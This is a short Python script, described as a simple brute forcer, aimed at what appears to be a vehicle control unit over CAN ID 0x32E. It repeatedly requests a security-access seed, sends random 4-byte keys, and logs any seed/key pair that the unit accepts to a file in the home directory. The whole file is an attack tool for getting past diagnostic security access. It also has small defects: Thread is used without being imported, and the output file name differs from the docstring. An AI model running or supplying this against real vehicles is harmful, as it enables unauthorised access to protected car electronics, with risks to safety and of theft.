import os
import threading

"""
Simple brute forcer.
Trying random keys without evaluating the received seed.
If successfull seed and key will be written to $HOME/seed_key
"""

def start(device):
    while True:
        device.open_connection()
        brute_force(device)
        device.reset()

def brute_force(device):
    device.send(0x32E, [0x11, 0x00, 0x02, 0x27, 0x03])
    seed1 = device.next_message().data
    seed2 = device.next_message().data
    device.send(0x32E, [0xB3])   # Ack reception of seed


    # Send random Key
    key = os.urandom(4)
    device.send(0x32E, [0x22, 0x00, 0x06, 0x27, 0x04, key[0], key[1], key[2]])
    device.send(0x32E, [0x13, key[3]])
    response = device.next_message()
    device.send(0x32E, [0xB4])   # Ack reception of response

    if response.data[3] != 0x7F:
        print("Found Key!")
        seed = "[{}, {}, {}, {}]".format(seed1[5], seed1[6], seed1[7], seed2[1])
        key = "[{}, {}, {}, {}]".format(key[0], key[1], key[2], key[3])
        # Start read thread to be nonblocking
        thread = Thread(target=write_found_key, args=(seed, key))
        thread.start()


    # Second run
    device.send(0x32E, [0x14, 0x00, 0x02, 0x27, 0x03])
    seed1 = device.next_message().data
    seed2 = device.next_message().data
    device.send(0x32E, [0xB6])   # Ack reception of seed

    # Send random Key
    key = os.urandom(4)
    device.send(0x32E, [0x25, 0x00, 0x06, 0x27, 0x04, key[0], key[1], key[2]])
    device.send(0x32E, [0x16, key[3]])
    response = device.next_message()
    device.send(0x32E, [0xB7])   # Ack reception of response


    if response.data[3] != 0x7F:
        print("Found Key!!")
        seed = "[{}, {}, {}, {}]".format(seed1[5], seed1[6], seed1[7], seed2[1])
        key = "[{}, {}, {}, {}]".format(key[0], key[1], key[2], key[3])
        # Start read thread to be nonblocking
        thread = Thread(target=write_found_key, args=(seed, key))
        thread.start()

def write_found_key(seed, key):
    f = open("{}/bruteforced_keys".format(os.environ["HOME"]), 'a')
    f.write("{} : {}\n".format(seed, key))
    f.close()
